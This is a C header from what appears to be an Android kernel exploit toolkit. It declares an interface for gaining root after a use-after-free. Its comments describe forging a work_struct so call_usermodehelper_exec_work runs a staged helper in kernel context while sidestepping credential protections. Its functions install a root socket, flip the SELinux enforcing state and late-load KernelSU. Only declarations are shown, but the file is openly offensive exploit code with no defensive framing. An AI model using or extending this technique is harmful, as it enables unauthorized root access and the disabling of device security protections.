#ifndef GL_UMH_H
#define GL_UMH_H

#include <stdint.h>
#include <stddef.h>

/*
 * Ghostlock-s26 style UMH (usermodehelper) workqueue root, integrated into GhostKey.
 *
 * This module requires:
 *  - arbitrary kernel read/write primitives (provided via callbacks)
 *  - ghostlock post-UAF offsets in the loaded kernel profile (v5):
 *      call_usermodehelper_exec_work, system_unbound_wq, selinux_enforcing_off
 *
 * It forges a work_struct on system_unbound_wq whose function is
 * call_usermodehelper_exec_work, executing a staged helper as kernel/init context
 * without writing task credentials (KDP-friendly).
 */

struct gl_umh_rw_ops {
  uint64_t (*read64)(void *ctx, uintptr_t addr);
  int (*read_data)(void *ctx, uintptr_t addr, void *out, size_t len);
  int (*write64)(void *ctx, uintptr_t addr, uint64_t value);
  int (*write_data)(void *ctx, uintptr_t addr, const void *data, size_t len);
  void *ctx;
};

struct gl_umh_offsets {
  uint64_t call_usermodehelper_exec_work; /* unslid kernel VA */
  uint64_t system_unbound_wq;             /* unslid kernel VA */
  uint64_t selinux_enforcing_off;         /* unslid kernel VA */
};

/* Returns 1 on success (root daemon socket ready), 0 on failure. */
int gl_umh_install_root(const struct gl_umh_rw_ops *rw,
                        const struct gl_umh_offsets *off,
                        uint64_t kaslr_slide,
                        const char *helper_path,
                        uint8_t *selinux_before,
                        uint8_t *selinux_after);

/* Probe ghostlock-style temp su socket readiness. */
int gl_umh_socket_ready(void);

/* Request KSU late-load via ghostlock 'K' protocol on temp su socket.
 * Returns status (0=loaded) or -1 on failure. */
int gl_umh_request_ksu(void);

/* Stage ksud for ghostlock late-load protocol. Returns 0 ok, -1 fail. */
int gl_umh_prepare_ksud_stage(const char *src_path);

#endif /* GL_UMH_H */
